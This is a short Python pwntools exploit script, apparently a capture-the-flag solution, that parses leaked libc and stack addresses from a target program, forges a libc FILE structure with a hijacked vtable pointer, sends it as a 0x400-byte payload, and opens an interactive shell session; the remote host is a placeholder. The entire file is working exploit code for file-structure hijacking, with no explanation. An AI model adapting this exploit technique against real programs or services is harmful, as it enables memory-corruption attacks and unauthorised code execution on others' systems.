#!/usr/bin/env python3
from pwn import *

exe = ELF("./a.oute")
# context.log_level='debug'
libc = ELF("./libc.so.6")
ld = ELF("./ld.so")
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("addr", 1337)
else:
    p = process([exe.path])
    # input()
    gdb.attach(p, """

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
p.recvuntil("libc: ")
libcs = int(p.recvuntil(b"\n",drop=True),16)
libc.address = libcs - libc.sym['_IO_2_1_stdout_']
log.info(f"libc.adress: {hex(libc.address)}")
p.recvuntil(b"stack: ")
stack = int(p.recvuntil(b"\n",drop=True),16)
vtable =0x404460
log.info(f"vtable: {hex(vtable)}")
log.info(f"stack: {hex(stack)}")
context.clear(arch='amd64')
fileStr = FileStructure(libc.sym._IO_wide_data_1)
fileStr.flags = 0xfbad2a84
fileStr.vtable = libc.sym._IO_2_1_stdout_+32
# fileStr.markers = 0
fileStr.chain = libc.sym._IO_2_1_stdin_
fileStr.fileno = 1
# fileStr._wide_data = libc.sym._IO_wide_data_1
fileStr._lock = libc.sym._IO_stdfile_1_lock
fileStr._old_offset = 0xffffffffffffffff
fileStr._offset = 0xffffffffffffffff

print(fileStr)
len(fileStr)
payload = bytes(fileStr) +b"paddings"
payload = payload.ljust(0x400,b"\0")
sa(b"there",payload)






p.interactive()
# good luck pwning :)

